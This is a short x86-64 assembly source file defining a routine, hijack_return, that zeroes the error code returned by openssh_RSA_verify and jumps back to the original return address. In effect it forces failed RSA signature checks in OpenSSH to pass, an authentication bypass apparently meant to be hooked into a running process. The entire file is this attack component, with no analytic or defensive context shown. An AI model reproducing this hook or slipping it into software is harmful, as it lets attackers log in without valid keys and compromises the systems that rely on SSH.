/*
 * Copyright (C) 2024 Stefano Moioli <smxdev4@gmail.com>
 **/
.intel_syntax noprefix
.section .note.GNU-stack,"",%progbits

.section .text
.globl hijack_return

hijack_return:
	// erase error code returned by openssh_RSA_verify
	xor rax, rax

	// jump to the original return address
	mov rdi, QWORD PTR [rip + orig_ret@GOTPCREL]
	jmp [rdi]

